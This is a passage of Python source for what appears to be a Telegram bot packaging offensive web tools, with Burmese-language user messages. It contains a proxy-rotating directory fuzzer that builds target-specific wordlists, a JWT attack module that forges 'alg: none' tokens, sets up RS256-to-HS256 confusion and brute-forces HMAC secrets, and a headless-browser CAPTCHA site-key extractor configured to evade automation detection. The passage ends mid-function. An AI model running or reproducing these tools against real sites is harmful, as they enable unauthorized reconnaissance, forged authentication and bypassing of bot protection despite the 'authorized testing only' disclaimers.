        r404 = requests.get(
            base_url.rstrip('/') + '/xyznotfound_abc123_never_exists',
            proxies=proxy_manager.get_proxy(), timeout=6, verify=False, headers=_get_headers()
        )
        baseline_status = r404.status_code
        baseline_hash   = hashlib.md5(r404.content[:512]).hexdigest()
        baseline_size   = len(r404.content)
    except Exception:
        baseline_status, baseline_hash, baseline_size = 404, '', 0

    def _probe(word):
        target = base_url.rstrip('/') + '/' + word.lstrip('/')
        try:
            r = requests.get(target, timeout=5, verify=False, headers=_get_headers(),
                             proxies=proxy_manager.get_proxy(), allow_redirects=True, stream=True)
            chunk = b''
            for part in r.iter_content(512):
                chunk += part
                if len(chunk) >= 512: break
            r.close()
            r_hash = hashlib.md5(chunk[:512]).hexdigest()
            r_size = len(chunk)
            # Filter baseline catch-all
            if r.status_code == baseline_status:
                if r_hash == baseline_hash: return None
                if baseline_size > 0 and abs(r_size - baseline_size) < 30: return None
            if r.status_code in (200, 201, 301, 302, 401, 403, 500):
                return {"url": target, "word": word, "status": r.status_code, "size": r_size}
        except Exception:
            pass
        return None

    done = 0
    with concurrent.futures.ThreadPoolExecutor(max_workers=15) as ex:
        fmap = {ex.submit(_probe, w): w for w in wordlist}
        for fut in concurrent.futures.as_completed(fmap, timeout=120):
            done += 1
            if progress_cb and done % 30 == 0:
                progress_cb(f"🧪 Fuzzing: `{done}/{len(wordlist)}` | Found: `{len(found)}`")
            try:
                res = fut.result(timeout=6)
                if res:
                    found.append(res)
            except Exception:
                pass

    found.sort(key=lambda x: (x['status'] != 200, x['status']))
    return found


async def cmd_smartfuzz(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/smartfuzz <url> — Context-aware wordlist builder + fuzzer"""
    if not await check_force_join(update, context):
        return

    if not context.args:
        await update.effective_message.reply_text(
            "📌 *Usage:* `/smartfuzz https://example.com`\n\n"
            "🗂️ *Smart Fuzzer — 3 Phases:*\n\n"
            "① *Context Harvesting* — Target ကို scrape ပြီး\n"
            "   Company name, product name, developer identifiers,\n"
            "   JS variables, class/ID names, meta keywords\n"
            "   တွေကို ဆုပ်ကိုင်ပါမည်\n\n"
            "② *Wordlist Generation* (CeWL-style)\n"
            "   ရလာတဲ့ words တွေကို backup/year/suffix combos\n"
            "   နဲ့ permutate လုပ်ပြီး custom dictionary ဆောက်ပါမည်\n"
            "   Example: `companyname_backup_2025.zip`\n\n"
            "③ *Smart Fuzzing*\n"
            "   Custom wordlist ဖြင့် target ကို probe လုပ်ပြီး\n"
            "   Baseline fingerprinting ဖြင့် false-positive စစ်ပါမည်\n\n"
            "📦 Wordlist + Results ကို export ပေးမည်\n"
            "⚠️ _Authorized testing only_",
            parse_mode='Markdown'
        )
        return

    uid = update.effective_user.id
    allowed, wait = check_rate_limit(uid)
    if not allowed:
        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode='Markdown')
        return

    url = context.args[0].strip()
    if not url.startswith('http'):
        url = 'https://' + url

    safe_ok, reason = is_safe_url(url)
    if not safe_ok:
        await update.effective_message.reply_text(f"🚫 `{reason}`", parse_mode='Markdown')
        return

    domain = urlparse(url).netloc
    base_url = f"{urlparse(url).scheme}://{urlparse(url).netloc}"
    msg = await update.effective_message.reply_text(
        f"🗂️ *Smart Fuzzer — `{domain}`*\n\n"
        "① Harvesting words from target...\n"
        "② Building custom wordlist...\n"
        "③ Fuzzing...\n\n⏳",
        parse_mode='Markdown'
    )

    progress_q = []

    async def _prog():
        while True:
            await asyncio.sleep(3)
            if progress_q:
                txt = progress_q[-1]; progress_q.clear()
                try:
                    await msg.edit_text(
                        f"🗂️ *SmartFuzz — `{domain}`*\n\n{txt}", parse_mode='Markdown')
                except Exception:
                    pass

    prog = asyncio.create_task(_prog())
    try:
        wordlist, raw_words = await asyncio.to_thread(
            _build_context_wordlist, url, lambda t: progress_q.append(t)
        )
        if not wordlist:
            prog.cancel()
            await msg.edit_text("❌ Words ဆွဲထုတ်မရပါ — site ကို access လုပ်မရနိုင်ပါ", parse_mode='Markdown')
            return

        progress_q.append(f"✅ Wordlist: `{len(wordlist)}` words\n🧪 Fuzzing နေပါသည်...")
        found = await asyncio.to_thread(
            _smartfuzz_probe_sync, base_url, wordlist,
            lambda t: progress_q.append(t)
        )
    except Exception as e:
        prog.cancel()
        await msg.edit_text(f"❌ Error: `{e}`", parse_mode='Markdown')
        return
    finally:
        prog.cancel()

    # ── Summary ───────────────────────────────────
    hits_200   = [f for f in found if f['status'] == 200]
    hits_auth  = [f for f in found if f['status'] in (401, 403)]
    hits_redir = [f for f in found if f['status'] in (301, 302)]
    hits_err   = [f for f in found if f['status'] == 500]

    lines = [
        f"🗂️ *SmartFuzz Results — `{domain}`*",
        f"━━━━━━━━━━━━━━━━━━━━",
        f"📝 Words scraped: `{len(raw_words)}`",
        f"🎯 Wordlist generated: `{len(wordlist)}`",
        f"🔍 Total probed: `{len(wordlist)}`",
        f"✅ Found: `{len(found)}` interesting",
        "",
    ]

    if hits_200:
        lines.append(f"*✅ HTTP 200 — Accessible ({len(hits_200)}):*")
        for h in hits_200[:15]:
            lines.append(f"  🟢 `/{h['word']}` → `{h['size']}B`")
        lines.append("")

    if hits_auth:
        lines.append(f"*🔒 Protected 401/403 ({len(hits_auth)}):*")
        for h in hits_auth[:10]:
            lines.append(f"  🔐 `/{h['word']}` [{h['status']}]")
        lines.append("")

    if hits_redir:
        lines.append(f"*↩️ Redirects ({len(hits_redir)}):*")
        for h in hits_redir[:5]:
            lines.append(f"  ↪ `/{h['word']}` [{h['status']}]")
        lines.append("")

    if hits_err:
        lines.append(f"*⚠️ Server Errors 500 ({len(hits_err)}):*")
        for h in hits_err[:5]:
            lines.append(f"  🔴 `/{h['word']}`")
        lines.append("")

    if not found:
        lines.append("📭 _Interesting paths မတွေ့ပါ_")

    lines.append("⚠️ _Authorized testing only_")

    report = "\n".join(lines)
    try:
        if len(report) <= 4000:
            await msg.edit_text(report, parse_mode='Markdown')
        else:
            await msg.edit_text(report[:4000], parse_mode='Markdown')
    except Exception:
        await update.effective_message.reply_text(report[:4000], parse_mode='Markdown')

    # ── Export wordlist + results as ZIP ─────────
    import io, zipfile as _zf
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    safe_d = re.sub(r'[^\w\-]', '_', domain)
    zip_buf = io.BytesIO()

    with _zf.ZipFile(zip_buf, 'w', _zf.ZIP_DEFLATED) as zf:
        zf.writestr("wordlist.txt", "\n".join(wordlist))
        zf.writestr("raw_words.txt", "\n".join(sorted(raw_words)))
        result_lines = [f"{f['status']}\t{f['url']}\t{f['size']}B" for f in found]
        zf.writestr("results.txt", "\n".join(result_lines) or "No results")
        zf.writestr("results.json", json.dumps({
            "domain": domain, "scanned_at": datetime.now().isoformat(),
            "wordlist_size": len(wordlist), "raw_words": len(raw_words),
            "found": found
        }, indent=2))

    zip_buf.seek(0)
    try:
        await context.bot.send_document(
            chat_id=update.effective_chat.id,
            document=zip_buf,
            filename=f"smartfuzz_{safe_d}_{ts}.zip",
            caption=(
                f"🗂️ *SmartFuzz Export — `{domain}`*\n"
                f"📝 Wordlist: `{len(wordlist)}` | Found: `{len(found)}`\n"
                "Files: `wordlist.txt` + `raw_words.txt` + `results.json`"
            ),
            parse_mode='Markdown'
        )
    except Exception as e:
        logger.warning("SmartFuzz export error: %s", e)


# ══════════════════════════════════════════════════
# 🎟️  FEATURE 12 — Advanced JWT Attacker & Cracker (/jwtattack)
# ══════════════════════════════════════════════════

import base64 as _b64

_JWT_COMMON_SECRETS = [
    "secret","password","123456","admin","key","jwt","token","test",
    "changeme","mysecret","your-256-bit-secret","your-secret-key",
    "secret_key","jwt_secret","app_secret","supersecret","private",
    "qwerty","abc123","letmein","welcome","monkey","dragon","master",
    "your-secret","secretkey","jwtpassword","pass","1234","12345",
    "123456789","qwerty123","iloveyou","princess","rockyou","football",
    "!@#$%^&*","pass123","admin123","root","toor","alpine","default",
    "secret123","jwt-secret","token-secret","api-secret","app-key",
    "HS256","RS256","none","null","undefined","example",
]

def _jwt_decode_payload(token: str) -> dict:
    """Decode JWT header + payload without verification."""
    parts = token.strip().split('.')
    if len(parts) != 3:
        return {"error": "Not a valid JWT (needs 3 parts separated by '.')"}
    try:
        def _b64_decode(s: str) -> dict:
            # Correct padding: -len(s) % 4 gives 0 when already aligned
            s = s.replace('-', '+').replace('_', '/')
            s += '=' * (-len(s) % 4)
            return json.loads(_b64.b64decode(s).decode('utf-8', 'replace'))
        header  = _b64_decode(parts[0])
        payload = _b64_decode(parts[1])
        return {"header": header, "payload": payload, "signature": parts[2][:20] + "..."}
    except Exception as e:
        return {"error": str(e)}


def _jwt_none_attack(token: str) -> dict:
    """None algorithm bypass — forge unsigned token."""
    parts = token.split('.')
    if len(parts) != 3:
        return {"success": False}
    try:
        header_dec = _jwt_decode_payload(token)["header"]
        orig_alg   = header_dec.get("alg", "HS256")
        forged_header = dict(header_dec)
        forged_header["alg"] = "none"
        def _b64e(d: dict) -> str:
            return _b64.b64encode(json.dumps(d, separators=(',',':')).encode()).decode().rstrip('=').replace('+','-').replace('/','_')
        forged = f"{_b64e(forged_header)}.{parts[1]}."
        return {
            "success": True,
            "original_alg": orig_alg,
            "forged_token":  forged,
            "method": "none_alg_bypass",
            "note": "Signature removed — send with empty sig. Some servers accept this."
        }
    except Exception as e:
        return {"success": False, "error": str(e)}


def _jwt_alg_confusion(token: str) -> dict:
    """Algorithm confusion — RS256→HS256 concept (no public key needed for demo)."""
    parts = token.split('.')
    if len(parts) != 3:
        return {"success": False}
    try:
        header_dec = _jwt_decode_payload(token)["header"]
        orig_alg   = header_dec.get("alg", "HS256")
        if orig_alg == "RS256":
            confused = dict(header_dec)
            confused["alg"] = "HS256"
            def _b64e(d: dict) -> str:
                return _b64.b64encode(json.dumps(d, separators=(',',':')).encode()).decode().rstrip('=').replace('+','-').replace('/','_')
            confused_header = _b64e(confused)
            note = (
                "RS256→HS256 confusion: Change alg to HS256 then sign with public key as secret.\n"
                "Tool: python-jwt or jwt_tool.py\n"
                "CMD: python3 jwt_tool.py -X k -pk pubkey.pem <token>"
            )
            return {"success": True, "original_alg": "RS256", "target_alg": "HS256",
                    "confused_header": confused_header, "method": "alg_confusion", "note": note}
        return {"success": False, "note": f"Alg is `{orig_alg}` (RS256 only for this attack)"}
    except Exception as e:
        return {"success": False, "error": str(e)}


def _jwt_brute_force(token: str, wordlist: list = None, progress_cb=None) -> dict:
    """Brute-force JWT HMAC secret from wordlist."""
    import hmac as _hmac
    parts = token.split('.')
    if len(parts) != 3:
        return {"cracked": False, "error": "Invalid JWT"}

    target_algs = {
        "HS256": hashlib.sha256,
        "HS384": hashlib.sha384,
        "HS512": hashlib.sha512,
    }

    # Detect algorithm
    header_info = _jwt_decode_payload(token).get("header", {})
    alg = header_info.get("alg", "HS256")
    if alg not in target_algs:
        return {"cracked": False, "error": f"Algorithm `{alg}` not brute-forceable (needs HMAC)"}

    hash_fn   = target_algs[alg]
    msg_bytes = f"{parts[0]}.{parts[1]}".encode()

    # Decode target signature
    sig_pad = parts[2].replace('-', '+').replace('_', '/')
    sig_pad += '=' * (-len(sig_pad) % 4)
    try:
        target_sig = _b64.b64decode(sig_pad)
    except Exception:
        return {"cracked": False, "error": "Cannot decode signature"}

    wl = wordlist or _JWT_COMMON_SECRETS
    total = len(wl)

    for i, secret in enumerate(wl):
        if progress_cb and i % 50 == 0:
            progress_cb(f"🔑 Brute-force: `{i}/{total}` tried")
        try:
            computed = _hmac.HMAC(secret.encode(), msg_bytes, hash_fn).digest()
            if computed == target_sig:
                return {"cracked": True, "secret": secret, "alg": alg, "tried": i + 1}
        except Exception:
            continue

    return {"cracked": False, "tried": total, "alg": alg}


async def cmd_jwtattack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/jwtattack <token> — Decode, attack, and crack JWT tokens"""
    if not await check_force_join(update, context):
        return

    if not context.args:
        await update.effective_message.reply_text(
            "📌 *Usage:* `/jwtattack <token>`\n\n"
            "🎟️ *JWT Attack Phases:*\n\n"
            "① *Decode* — Header + Payload reveal\n"
            "   Algorithm, expiry, user roles, claims\n\n"
            "② *None Algorithm Bypass*\n"
            "   `alg: none` — unsigned token forge\n\n"
            "③ *Algorithm Confusion*\n"
            "   RS256 → HS256 confusion attack\n\n"
            "④ *Secret Key Brute-force*\n"
            f"   `{len(_JWT_COMMON_SECRETS)}` common secrets + dictionary\n\n"
            "💡 `/extract <url>` နဲ့ token ရှာပြီး ဒီမှာ paste ပါ",
            parse_mode='Markdown'
        )
        return

    uid = update.effective_user.id
    allowed, wait = check_rate_limit(uid)
    if not allowed:
        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode='Markdown')
        return

    token = context.args[0].strip()

    # URL pass လုပ်မိရင် ကောင်းကောင်း error ပြ
    if token.startswith('http://') or token.startswith('https://'):
        await update.effective_message.reply_text(
            "❌ *URL မဟုတ်ဘဲ JWT Token ထည့်ပါ*\n\n"
            "JWT format: `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.xxxxx`\n\n"
            "💡 Token ကိုရှာဖို့ `/extract <url>` သုံးနိုင်သည်",
            parse_mode='Markdown'
        )
        return

    # Basic JWT format check (3 parts, each part is base64url)
    if token.count('.') != 2:
        await update.effective_message.reply_text(
            "❌ Valid JWT မဟုတ်ပါ\n"
            "JWT format: `xxxxx.yyyyy.zzzzz` (dot 3 ပိုင်း ပါရမည်)",
            parse_mode='Markdown'
        )
        return

    parts = token.split('.')
    for i, part in enumerate(parts[:2]):
        if len(part) < 4:
            await update.effective_message.reply_text(
                f"❌ JWT part {i+1} တိုလွန်းနေသည် — Valid token ထည့်ပါ",
                parse_mode='Markdown'
            )
            return

    msg = await update.effective_message.reply_text(
        "🎟️ *JWT Attacker Running...*\n\n"
        "① Decoding...\n② None attack...\n③ Alg confusion...\n④ Brute-forcing...\n⏳",
        parse_mode='Markdown'
    )

    # ── Phase 1: Decode ──────────────────────────
    decoded = _jwt_decode_payload(token)
    if "error" in decoded:
        await msg.edit_text(f"❌ Decode error: `{decoded['error']}`", parse_mode='Markdown')
        return

    header  = decoded.get("header", {})
    payload = decoded.get("payload", {})
    alg     = header.get("alg", "unknown")

    # Format payload nicely
    def _fmt_payload(p: dict) -> str:
        lines = []
        important_keys = ['sub','iss','aud','exp','iat','nbf','role','roles',
                          'user_id','uid','email','username','admin','scope',
                          'permissions','type','jti']
        for k in important_keys:
            if k in p:
                v = p[k]
                if k in ('exp','iat','nbf') and isinstance(v, int):
                    try:
                        from datetime import datetime as _dt
                        v = f"{v} ({_dt.utcfromtimestamp(v).strftime('%Y-%m-%d %H:%M UTC')})"
                    except Exception:
                        pass
                lines.append(f"  `{k}`: `{str(v)[:80]}`")
        remaining = {k: v for k, v in p.items() if k not in important_keys}
        for k, v in list(remaining.items())[:10]:
            lines.append(f"  `{k}`: `{str(v)[:60]}`")
        return "\n".join(lines) or "  (empty)"

    payload_str = _fmt_payload(payload)

    # ── Phase 2: None attack ─────────────────────
    none_res = _jwt_none_attack(token)

    # ── Phase 3: Alg confusion ───────────────────
    alg_res = _jwt_alg_confusion(token)

    # ── Phase 4: Brute-force (in thread) ─────────
    progress_q = []

    async def _prog():
        while True:
            await asyncio.sleep(2)
            if progress_q:
                txt = progress_q[-1]; progress_q.clear()
                try:
                    await msg.edit_text(
                        f"🎟️ *JWT Attacker*\n\n🔑 {txt}", parse_mode='Markdown')
                except Exception:
                    pass

    prog = asyncio.create_task(_prog())
    try:
        bf_res = await asyncio.to_thread(
            _jwt_brute_force, token, None, lambda t: progress_q.append(t)
        )
    except Exception as e:
        bf_res = {"cracked": False, "error": str(e)}
    finally:
        prog.cancel()

    # ── Build report ─────────────────────────────
    lines = [
        "🎟️ *JWT Attack Report*",
        "━━━━━━━━━━━━━━━━━━━━",
        "",
        f"*① Decoded Token:*",
        f"  Algorithm: `{alg}`",
        f"  Header: `{json.dumps(header, separators=(',',':'))[:100]}`",
        f"",
        f"*📋 Payload:*",
        payload_str,
        "",
    ]

    # None attack result
    lines.append("*② None Algorithm Bypass:*")
    if none_res.get("success"):
        forged = none_res['forged_token']
        lines.append(f"  ✅ *VULNERABLE — unsigned token forged!*")
        lines.append(f"  Original alg: `{none_res['original_alg']}`")
        lines.append(f"  Forged token (truncated):\n  `{forged[:80]}...`")
        lines.append(f"  _{none_res.get('note','')}_")
    else:
        lines.append(f"  ⚪ Not applicable or failed")
    lines.append("")

    # Alg confusion result
    lines.append("*③ Algorithm Confusion:*")
    if alg_res.get("success"):
        lines.append(f"  🟠 RS256 → HS256 confusion possible!")
        lines.append(f"  _{alg_res.get('note','')[:150]}_")
    else:
        lines.append(f"  ⚪ {alg_res.get('note', 'Not applicable')}")
    lines.append("")

    # Brute-force result
    lines.append("*④ Secret Key Brute-force:*")
    if bf_res.get("cracked"):
        secret = bf_res['secret']
        lines.append(f"  🔴 *SECRET FOUND!*")
        lines.append(f"  Key: `{secret}`")
        lines.append(f"  Algorithm: `{bf_res.get('alg','?')}`")
        lines.append(f"  Tried: `{bf_res.get('tried',0)}` passwords")
    elif "error" in bf_res:
        lines.append(f"  ⚪ `{bf_res['error']}`")
    else:
        lines.append(f"  ✅ Not cracked (`{bf_res.get('tried',0)}` common secrets tried)")
        lines.append("  _Custom wordlist ဖြင့် ထပ်ကြိုးစားနိုင်သည်_")
    lines.append("")
    lines.append("━━━━━━━━━━━━━━━━━━")
    lines.append("⚠️ _Authorized security research only_")

    report = "\n".join(lines)
    try:
        if len(report) <= 4000:
            await msg.edit_text(report, parse_mode='Markdown')
        else:
            await msg.edit_text(report[:4000], parse_mode='Markdown')
    except Exception:
        await update.effective_message.reply_text(report[:4000], parse_mode='Markdown')

    # Export full JSON report
    import io
    full_report = {
        "token": token,
        "decoded": decoded,
        "none_attack": none_res,
        "alg_confusion": alg_res,
        "brute_force": bf_res,
        "analyzed_at": datetime.now().isoformat(),
    }
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    report_buf = io.BytesIO(json.dumps(full_report, indent=2, default=str).encode())
    try:
        await context.bot.send_document(
            chat_id=update.effective_chat.id,
            document=report_buf,
            filename=f"jwt_report_{ts}.json",
            caption="🎟️ *JWT Full Report* — JSON export",
            parse_mode='Markdown'
        )
    except Exception as e:
        logger.warning("JWT export error: %s", e)


# ══════════════════════════════════════════════════
# 🔑  FEATURE 13 — CAPTCHA Site Key Extractor (/sitekey)
#     reCAPTCHA v2/v3 · hCaptcha · Turnstile · FunCaptcha
#     Extracts: site_key, page_url, action, captcha_type
# ══════════════════════════════════════════════════

# ── Regex patterns per captcha type ─────────────
_CAPTCHA_PATTERNS = {

    # ─── reCAPTCHA v2 ────────────────────────────
    "reCAPTCHA v2": [
        # data-sitekey attribute
        re.compile(r'data-sitekey=["\']([0-9A-Za-z_\-]{20,60})["\']', re.I),
        # grecaptcha.render
        re.compile(r'grecaptcha\.render\s*\([^)]*["\']sitekey["\']\s*:\s*["\']([0-9A-Za-z_\-]{20,60})["\']', re.I),
        # siteKey / site_key object key
        re.compile(r'["\']sitekey["\']\s*:\s*["\']([0-9A-Za-z_\-]{20,60})["\']', re.I),
        re.compile(r'["\']site_key["\']\s*:\s*["\']([0-9A-Za-z_\-]{20,60})["\']', re.I),
        re.compile(r'siteKey\s*[=:]\s*["\']([0-9A-Za-z_\-]{20,60})["\']', re.I),
    ],

    # ─── reCAPTCHA v3 ────────────────────────────
    "reCAPTCHA v3": [
        # grecaptcha.execute(key, {action:...})
        re.compile(r'grecaptcha\.execute\s*\(\s*["\']([0-9A-Za-z_\-]{20,60})["\']', re.I),
        # grecaptcha.ready + execute in same script
        re.compile(r'execute\(["\']([6][A-Za-z0-9_\-]{39})["\']', re.I),
    ],

    # ─── hCaptcha ────────────────────────────────
    "hCaptcha": [
        re.compile(r'data-sitekey=["\']([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})["\']', re.I),
        re.compile(r'hcaptcha\.render\s*\([^)]*["\']sitekey["\']\s*:\s*["\']([0-9a-f\-]{36})["\']', re.I),
        re.compile(r'["\']sitekey["\']\s*:\s*["\']([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})["\']', re.I),
    ],

    # ─── Cloudflare Turnstile ─────────────────────
    "Cloudflare Turnstile": [
        re.compile(r'data-sitekey=["\']([0-9A-Za-z_\-]{20,60})["\'].*?turnstile|turnstile.*?data-sitekey=["\']([0-9A-Za-z_\-]{20,60})["\']', re.I | re.S),
        re.compile(r'turnstile\.render\s*\([^)]*["\']sitekey["\']\s*:\s*["\']([0-9A-Za-z_\-]{20,60})["\']', re.I),
        # Turnstile keys start with 0x4A or 1x00
        re.compile(r'["\']sitekey["\']\s*:\s*["\']([01]x[0-9A-Fa-f_\-]{20,60})["\']', re.I),
        re.compile(r'data-sitekey=["\']([01]x[0-9A-Fa-f_\-]{20,60})["\']', re.I),
    ],

    # ─── FunCaptcha (Arkose Labs) ─────────────────
    "FunCaptcha": [
        re.compile(r'(?:public_key|data-pkey)\s*[=:]\s*["\']([0-9A-Fa-f]{8}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{12})["\']', re.I),
        re.compile(r'ArkoseEnforcement\s*\([^)]*["\']([0-9A-Fa-f]{8}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{12})["\']', re.I),
    ],

    # ─── GeeTest ─────────────────────────────────
    "GeeTest": [
        re.compile(r'gt\s*[=:]\s*["\']([0-9a-f]{32})["\']', re.I),
        re.compile(r'["\']gt["\']\s*:\s*["\']([0-9a-f]{32})["\']', re.I),
    ],

    # ─── AWS WAF Captcha ──────────────────────────
    "AWS WAF Captcha": [
        re.compile(r'AwsWafIntegration\.getToken\s*\(\s*["\']([^"\']{10,200})["\']', re.I),
        re.compile(r'jsapi\.token\s*[=:]\s*["\']([^"\']{10,200})["\']', re.I),
    ],
}

# ─── reCAPTCHA action pattern ────────────────────
_ACTION_PATTERNS = [
    re.compile(r'action\s*:\s*["\']([a-zA-Z0-9_\/]{2,60})["\']', re.I),
    re.compile(r'["\']action["\']\s*:\s*["\']([a-zA-Z0-9_\/]{2,60})["\']', re.I),
    re.compile(r'grecaptcha\.execute\s*\([^,]+,\s*\{[^}]*action\s*:\s*["\']([a-zA-Z0-9_\/]{2,60})["\']', re.I),
]

# ─── Script src patterns (detect captcha from includes) ─
_CAPTCHA_SCRIPT_SIGS = {
    "reCAPTCHA": ["google.com/recaptcha", "recaptcha/api.js", "recaptcha/enterprise.js"],
    "hCaptcha":  ["hcaptcha.com/1/api.js", "js.hcaptcha.com"],
    "Turnstile": ["challenges.cloudflare.com/turnstile"],
    "FunCaptcha": ["funcaptcha.com", "arkoselabs.com"],
    "GeeTest":   ["gt.captcha.com", "static.geetest.com"],
}


def _extract_captcha_info(html: str, page_url: str, js_sources: dict = None) -> list:
    """
    Extract all captcha site_key / action / page_url from HTML + JS.
    Returns list of finding dicts.
    """
    findings = []
    seen_keys = set()

    def _scan_text(text: str, source_label: str):
        for cap_type, patterns in _CAPTCHA_PATTERNS.items():
            for pat in patterns:
                for m in pat.finditer(text):
                    # Get first non-None group (handles alternation patterns)
                    if m.lastindex and m.lastindex >= 1:
                        key = next((g for g in m.groups() if g), None)
                    else:
                        try:
                            key = m.group(1)
                        except IndexError:
                            key = m.group(0)
                    if not key:
                        continue
                    key = key.strip()
                    if len(key) < 10:
                        continue
                    dedup = cap_type + ":" + key
                    if dedup in seen_keys:
                        continue
                    seen_keys.add(dedup)

                    # Extract action from surrounding context (±400 chars)
                    action = ""
                    ctx_start = max(0, m.start() - 400)
                    ctx_end   = min(len(text), m.end() + 400)
                    ctx       = text[ctx_start:ctx_end]
                    for ap in _ACTION_PATTERNS:
                        am = ap.search(ctx)
                        if am:
                            cand = am.group(1)
                            # Filter out false-positives (too generic)
                            if cand not in ('get','set','use','new','add','key','id'):
                                action = cand
                                break

                    findings.append({
                        "type":     cap_type,
                        "site_key": key,
                        "page_url": page_url,
                        "action":   action,
                        "source":   source_label,
                    })

    # Scan main HTML
    _scan_text(html, "HTML source")

    # Scan inline scripts separately for better context
    soup = BeautifulSoup(html, 'html.parser')
    for i, script in enumerate(soup.find_all('script')):
        if script.string and script.string.strip():
            _scan_text(script.string, f"Inline script #{i}")

    # Scan external JS sources if provided
    if js_sources:
        for js_url, js_text in js_sources.items():
            _scan_text(js_text, f"JS: {js_url[:60]}")

    # ─── Detect captcha type from script src (even without key) ──
    script_tags = [t.get('src', '') for t in soup.find_all('script', src=True)]
    detected_via_script = set()
    for src in script_tags:
        for cap_type, sigs in _CAPTCHA_SCRIPT_SIGS.items():
            if any(sig in src for sig in sigs):
                detected_via_script.add((cap_type, src))

    # Add script-detected types that have no key found yet
    found_types = {f["type"].split()[0] for f in findings}
    for cap_type, src in detected_via_script:
        short = cap_type.split()[0]
        if short not in found_types:
            findings.append({
                "type":     cap_type + " ⚠️ (key not found)",
                "site_key": "",
                "page_url": page_url,
                "action":   "",
                "source":   f"Script include: {src[:80]}",
            })

    return findings


def _sitekey_playwright(url: str, progress_cb=None) -> dict:
    """
    DevTools-style sitekey extraction using Playwright.
    Intercepts ALL network requests like Chrome DevTools → Network tab.
    Extracts sitekeys from:
      - Request URLs  (recaptcha/api2/anchor?k=SITEKEY)
      - POST bodies   (hcaptcha checksiteconfig)
      - Console logs  (window.console messages)
      - Final DOM     (data-sitekey attributes after JS execution)
    """
    try:
        from playwright.sync_api import sync_playwright, TimeoutError as PWTimeout
    except ImportError:
        return {"error": "playwright_not_installed", "findings": [], "page_url": url}

    findings     = []
    seen_keys    = set()
    network_log  = []   # all intercepted requests
    console_log  = []   # all console messages
    page_url_ref = [url]

    # ── Patterns to extract key from intercepted request URL ──
    _NET_PATTERNS = [
        # reCAPTCHA v2 / v3
        (re.compile(r'google\.com/recaptcha/api2/(?:anchor|bframe|reload)\?[^"\']*[?&]k=([0-9A-Za-z_\-]{20,60})', re.I), "reCAPTCHA v2"),
        (re.compile(r'google\.com/recaptcha/enterprise/(?:anchor|bframe|reload)\?[^"\']*[?&]k=([0-9A-Za-z_\-]{20,60})', re.I), "reCAPTCHA Enterprise"),
        (re.compile(r'recaptcha/api\.js\?render=([0-9A-Za-z_\-]{20,60})', re.I), "reCAPTCHA v3"),
        (re.compile(r'recaptcha/enterprise\.js\?render=([0-9A-Za-z_\-]{20,60})', re.I), "reCAPTCHA Enterprise"),
        # hCaptcha
        (re.compile(r'hcaptcha\.com/checksiteconfig\?[^"\']*sitekey=([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})', re.I), "hCaptcha"),
        (re.compile(r'hcaptcha\.com/getcaptcha\?s=([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})', re.I), "hCaptcha"),
        (re.compile(r'hcaptcha\.com/[^?]*\?[^"\']*sitekey=([0-9a-f\-]{36})', re.I), "hCaptcha"),
        # Cloudflare Turnstile
        (re.compile(r'challenges\.cloudflare\.com/turnstile/[^?]+\?[^"\']*sitekey=([0-9A-Za-z_\-]{20,60})', re.I), "Cloudflare Turnstile"),
        (re.compile(r'challenges\.cloudflare\.com/turnstile/v0/api\.js\?[^"\']*render=([0-9A-Za-z_\-]{20,60})', re.I), "Cloudflare Turnstile"),
        # FunCaptcha
        (re.compile(r'(?:funcaptcha\.com|arkoselabs\.com)[^"\']*pk=([0-9A-Fa-f]{8}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{12})', re.I), "FunCaptcha"),
    ]

    # ── POST body patterns ─────────────────────────
    _BODY_PATTERNS = [
        (re.compile(r'"sitekey"\s*:\s*"([0-9A-Za-z_\-]{20,60})"', re.I), "From POST body"),
        (re.compile(r'sitekey=([0-9A-Za-z_\-]{20,60})', re.I), "From POST body"),
        (re.compile(r'"k"\s*:\s*"([0-9A-Za-z_\-]{20,60})"', re.I), "From POST body"),
    ]

    def _add_finding(cap_type, key, source, page_url):
        dedup = cap_type + ":" + key
        if dedup not in seen_keys and len(key) >= 10:
            seen_keys.add(dedup)
            findings.append({
                "type":     cap_type,
                "site_key": key,
                "page_url": page_url,
                "action":   "",
                "source":   source,
            })

    def _scan_url(req_url: str, page_url: str):
        for pat, cap_type in _NET_PATTERNS:
            m = pat.search(req_url)
            if m:
                _add_finding(cap_type, m.group(1), f"Network request: {req_url[:100]}", page_url)

    def _scan_body(body: str, req_url: str, page_url: str):
        for pat, label in _BODY_PATTERNS:
            for m in pat.finditer(body):
                _add_finding("reCAPTCHA/hCaptcha (POST)", m.group(1),
                             f"{label} → {req_url[:80]}", page_url)

    with sync_playwright() as pw:
        if progress_cb: progress_cb("🌐 Launching headless browser...")

        browser = pw.chromium.launch(
            headless=True,
            args=[
                '--no-sandbox',
                '--disable-dev-shm-usage',
                '--disable-blink-features=AutomationControlled',
                '--disable-web-security',
            ]
        )
        context_pw = browser.new_context(
            user_agent=(
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                'AppleWebKit/537.36 (KHTML, like Gecko) '
                'Chrome/120.0.0.0 Safari/537.36'
            ),
            viewport={"width": 1280, "height": 720},
            ignore_https_errors=True,
        )
        page = context_pw.new_page()

        # ── Intercept every network request ────────
        def _on_request(request):
            req_url = request.url
            network_log.append(req_url)
            _scan_url(req_url, page_url_ref[0])
            # Also scan POST body
            try:
                body = request.post_data
